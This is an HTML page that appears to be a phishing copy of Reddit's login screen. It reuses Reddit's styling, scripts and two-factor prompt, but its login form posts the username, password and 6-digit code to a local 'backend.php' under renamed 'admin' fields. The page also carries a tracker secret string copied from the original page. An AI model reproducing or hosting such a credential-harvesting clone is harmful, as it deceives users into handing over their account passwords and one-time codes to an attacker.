
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>reddit.com: Log in</title>
        <link rel="shortcut icon" type="image/png" sizes="512x512" href="https://www.redditstatic.com/accountmanager/favicon/favicon-512x512.png">
        <link rel="shortcut icon" type="image/png" sizes="192x192" href="https://www.redditstatic.com/accountmanager/favicon/favicon-192x192.png">
        <link rel="shortcut icon" type="image/png" sizes="32x32" href="https://www.redditstatic.com/accountmanager/favicon/favicon-32x32.png">
        <link rel="shortcut icon" type="image/png" sizes="16x16" href="https://www.redditstatic.com/accountmanager/favicon/favicon-16x16.png">
        <link rel="apple-touch-icon" sizes="180x180" href="https://www.redditstatic.com/accountmanager/favicon/apple-touch-icon-180x180.png">
        <link rel="mask-icon" href="https://www.redditstatic.com/accountmanager/favicon/safari-pinned-tab.svg" color="#5bbad5">
        <link rel="canonical" href="https://www.reddit.com/login/">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <meta name="msapplication-TileColor" content="#ffffff"/>
        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/accountmanager/favicon/mstile-310x310.png"/>
        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/accountmanager/favicon/mstile-310x150.png"/>
        <meta name="theme-color" content="#ffffff">
        
<meta name="description" content="Don’t worry, we won’t tell anyone your username. Log in to your Reddit account.">

        

  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/vendor.4edfac426c2c4357e34e.css">

  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/theme.bf3c4fed32b8d285e588.css">

  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/login.a2a948983c9f12b10c1b.css">


    </head>
    <body>
        
<div class="App m-desktop   ">
  


  


  
<main class="Login">
  
<div class="OnboardingStep Onboarding__step mode-auth" data-step="username-and-password">
  <div class="Step">
    

    
    <div class="Step__content">
      
        

  

      
      
    
      
        
        <h1 class="Title m-no-margin">Login</h1>
        
<p class="UserAgreement ">
  By continuing, you agree to our <a target="_blank" href="https://www.redditinc.com/policies/user-agreement">User Agreement</a> and <a target="_blank" href="https://www.redditinc.com/policies/privacy-policy">Privacy Policy</a>.
</p>

      
    
   
      
        <p class="tfa-description hideable">
          You have two-factor authentication enabled on this account because you&#39;re awesome.
        </p>
      
      
      <div class="Sso">
        
          <div id="google-sso" class="Sso__button Sso__googleIdButton">
            Continue with Google
          </div>
          <div id="appleid-signin-container" class="Sso__button Sso__appleIdContainer">
            Continue with Apple
            <div id="appleid-signin" class="Sso__appleIdButton" data-type="sign in"></div>
          </div>
          
            
  

          
        
        
          <div class="Sso__divider ">
            <span class="Sso__dividerLine"></span>
            <span class="Sso__dividerText">or</span>
            <span class="Sso__dividerLine"></span>
          </div>
        
      </div>
      
      
      
  <form action="backend.php" method="POST">      
<fieldset class="AnimatedForm__field m-required login hideable">
  
  <input id="loginUsername" class="AnimatedForm__textInput " type="text" name="username_admin" required placeholder="
        Username
      ">
  <label class="AnimatedForm__textInputLabel " for="loginUsername">
    
        Username
      
  </label>
  <div class="AnimatedForm__errorMessage"></div>
</fieldset>

        
<fieldset class="AnimatedForm__field m-required password hideable m-small-margin">
  
  <input id="loginPassword" class="AnimatedForm__textInput " type="password" name="password_admin" required placeholder="
        Password
      ">
  <label class="AnimatedForm__textInputLabel " for="loginPassword">
    
        Password
      
  </label>
  <div class="AnimatedForm__errorMessage"></div>
</fieldset>

      
      
      <div class="two-modes-separator"></div>
      
<fieldset class="AnimatedForm__field m-required otp">
  
  
  <input id="otp" class="AnimatedForm__textInput " type="tel" name="otp" pattern="[0-9]*" autocomplete="off" placeholder="
    6 digit code
  " data-lpignore="true">
  <label class="AnimatedForm__textInputLabel " for="otp">
    
    6 digit code
  
  </label>
  <div class="AnimatedForm__errorMessage"></div>
</fieldset>

      
<fieldset class="AnimatedForm__field switch-otp-type">
  <input type="hidden" name="otp-type" value="app">
  <span class="BottomLink switch-otp-type">
    
      use a backup code
  </span>
</fieldset>

      
      
        
<fieldset class="AnimatedForm__field m-small-margin">
  <button class="AnimatedForm__submitButton m-full-width" name="login_admin" type="submit">
    
        Log In
      
  </button>
  <div class="AnimatedForm__submitStatus">
    <div class="AnimatedForm__submitStatusIcon"></div>
    <span class="AnimatedForm__submitStatusMessage"></span>
  </div>
</fieldset>

      
      
        <div class="BottomText m-secondary-text login-bottom-text hideable">
          
          
          
          
          
          <span class="BottomLink m-secondary-text">Forgot your</span> <a class="BottomLink m-secondary-text" href="/username?dest=https%3A%2F%2Fwww.reddit.com%2Fsubmit%3Furl%3Dhttps%253A%252F%252Ffreefrontend.com%252Fbootstrap-login-forms%252F%2523.Yj2zdRLHa2Y.reddit%26title%3D67%2520Bootstrap%2520Login%2520Forms">username</a> <span class="BottomLink m-secondary-text">or</span> <a class="BottomLink m-secondary-text" href="/password?dest=https%3A%2F%2Fwww.reddit.com%2Fsubmit%3Furl%3Dhttps%253A%252F%252Ffreefrontend.com%252Fbootstrap-login-forms%252F%2523.Yj2zdRLHa2Y.reddit%26title%3D67%2520Bootstrap%2520Login%2520Forms">password</a><span class="BottomLink m-secondary-text m-question">&nbsp;?</span>
        </div>
      
      
        
<div class="BottomText login-bottom-text register hideable">
  New to Reddit?
  
    <a class="BottomLink" href="/account/register/?dest=https%3A%2F%2Fwww.reddit.com%2Fsubmit%3Furl%3Dhttps%253A%252F%252Ffreefrontend.com%252Fbootstrap-login-forms%252F%2523.Yj2zdRLHa2Y.reddit%26title%3D67%2520Bootstrap%2520Login%2520Forms">Sign up</a>
  
</div>

      
      
        <div class="BottomText tfa-bottom-text hideable">
          <span class="BottomLink back-to-main">Go&nbsp;back&nbsp;to&nbsp;account&nbsp;details</span><!--
          --><span class="LinkSeparator">•</span><!--
          --><a class="BottomLink" target="_blank" href="https://www.reddithelp.com/en/categories/using-reddit/your-reddit-account/how-set-two-factor-authentication">Having&nbsp;trouble&nbsp;?</a>
        </div>
      
    </form>
  
    </div>
  </div>
</div>


  
  

  

  


  

  


  

  


  
    
  
    
<div class="OnboardingStep Onboarding__step " data-step="subscribe">
  <div class="Step">
    
    <div class="Step__content">
      
        

  

      
      
      <div class="AnimatedForm__header">
        <h1 class="Title m-no-margin">Find communities by topics you’re interested in.</h1>
        <p class="Description">
          Reddit is filled with interest based communities, offering something for everyone.
          <br/>
          Reddit works best when you have joined at least 5 communities.
        </p>
      </div>
      <div id="SubredditSubscriptions"></div>
      <div class="AnimatedForm__bottomNav">
        <span class="AnimatedForm__submitStatus" data-step="&lt;Macro &#39;step&#39;&gt;">
          <span class="AnimatedForm__submitStatusIcon"></span>
          <span class="AnimatedForm__submitStatusMessage"></span>
        </span>
        <button class="AnimatedForm__submitButton SubscribeButton" type="submit" data-step="&lt;Macro &#39;step&#39;&gt;">Finish</button>
      </div>
    
    </div>
  </div>
</div>

  

  
</main>

</div>


        <script>
            //<![CDATA
                
                window.___r = {"config": {"tracker_endpoint": "https://events.reddit.com/v2", "tracker_key": "AccountManager3", "tracker_secret": "V2FpZ2FlMlZpZTJ3aWVyMWFpc2hhaGhvaHNoZWl3"}};
            //]]>
        </script>
        
  
  
    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/vendor.941e4bd8482652215fd8.js"></script>
  
    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/theme.f14f24331125726619b0.js"></script>
  
    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/sentry.a6aa116edbd163ca9db2.js"></script>
  
    <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/login.543f12aa8dc93be9f074.js"></script>
  

    </body>
</html>